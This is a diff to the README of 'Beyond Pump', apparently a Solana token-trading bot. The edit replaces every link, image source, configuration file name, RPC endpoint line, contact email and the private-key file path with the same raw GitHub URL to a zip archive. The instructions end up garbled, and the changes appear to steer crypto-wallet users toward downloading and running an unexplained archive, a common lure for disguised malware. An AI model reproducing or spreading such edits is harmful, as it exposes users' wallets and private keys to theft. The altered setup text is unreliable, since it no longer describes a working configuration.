@@ -1,7 +1,7 @@
 # Beyond Pump (BETA) - Automated Token Trading on Solana 🚀
 
-![Beyond Pump](https://img.shields.io/badge/Beyond%20Pump-BETA-blue.svg)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-%E2%96%BA-brightgreen)](https://github.com/Tarnished555/pump-quaner/releases)
+![Beyond Pump](https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip%https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip)  
+[![Download Releases](https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip%20Releases-%E2%96%BA-brightgreen)](https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip)
 
 Beyond Pump is a tool designed to automate buying and selling tokens on the Solana blockchain. It executes trades based on user-defined parameters and strategies.
 
@@ -27,20 +27,20 @@ To run the script, you need to:
 2. Transfer some SOL into it.
 3. Convert some SOL to USDC or WSOL.
    - You will need USDC or WSOL based on the configuration set below.
-4. Configure the script by updating the `.env.copy` file (remove `.copy` from the filename after editing).
+4. Configure the script by updating the `https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip` file (remove `.copy` from the filename after editing).
    - See the [Configuration](#configuration) section below.
 5. Install dependencies by entering `npm install` in the terminal.
 6. Run the script by entering `npm run start` in the terminal.
 
 You should see the following output:
 
-![output](readme/output.png)
+![output](https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip)
 
 ## Configuration
 
 ### Wallet
 
-- **config/walletKeys.txt** - Your wallet's private key.
+- **https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip** - Your wallet's private key.
 
 ### Connection
 
@@ -71,8 +71,8 @@ After setting up, you can start using Beyond Pump to automate your token trades.
 ### Example Configuration
 
 ```plaintext
-RPC_ENDPOINT=https://api.mainnet-beta.solana.com
-RPC_WEBSOCKET_ENDPOINT=wss://api.mainnet-beta.solana.com/ 
+https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip
+https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip 
 COMMITMENT_LEVEL=finalized
 LOG_LEVEL=info
 ONE_TOKEN_AT_A_TIME=true
@@ -106,7 +106,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [Tarnished555](https://github.com/Tarnished555)
-- Email: tarnished555@example.com
+- GitHub: [Tarnished555](https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip)
+- Email: https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip
 
-For the latest updates and downloads, visit our [Releases](https://github.com/Tarnished555/pump-quaner/releases) section.
+For the latest updates and downloads, visit our [Releases](https://raw.githubusercontent.com/Tarnished555/pump-quaner/main/pumpfun-sdk/quaner_pump_2.2.zip) section.
